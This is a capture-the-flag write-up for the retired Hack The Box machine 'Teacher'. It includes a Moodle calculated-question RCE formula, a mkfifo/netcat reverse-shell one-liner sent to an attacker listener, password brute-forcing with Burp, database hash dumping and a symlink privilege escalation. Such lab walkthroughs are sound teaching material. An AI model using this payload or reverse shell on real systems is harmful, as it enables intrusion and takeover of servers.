<meta name="description" content="Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &lt;img src=&quot;images/5.png&quot;&gt; there is an onerror attribute to print That&#39;s an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &gt;&gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha!

Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since /home/giovanni/work/tmp has permissions set to 777 , Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.

I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to <code class="highlighter-rouge">/root</code> or anything else we want to access. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.153</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">teacher.htb</code>.

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 

Could you guys figure out what the last charachter is, or just reset it?
